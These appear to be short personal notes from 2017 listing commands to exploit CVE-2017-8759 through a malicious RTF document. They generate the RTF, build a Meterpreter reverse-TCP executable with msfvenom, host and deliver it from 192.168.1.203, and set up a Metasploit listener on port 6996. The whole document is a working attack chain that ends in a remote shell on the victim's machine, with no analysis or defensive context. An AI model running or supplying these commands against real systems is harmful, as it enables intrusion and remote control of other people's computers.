# Notes: Jeffrey Li 9/22/2017

#generate the malcious RTF file
python cve-2017-8759_toolkit.py -M gen -w Gotcha.rtf -u http://192.168.1.203/gotcha.txt

#generate the payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.203 LPORT=6996 -f exe > /tmp/gotcha.exe

#start the toolkit in exploit mode to host and deliver the payload
python cve-2017-8759_toolkit.py -M exp -e http://192.168.1.203/gotcha.exe -l /tmp/gotcha.exe

# msfonsole command (RC script)
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.203
set lport 6996
exploit

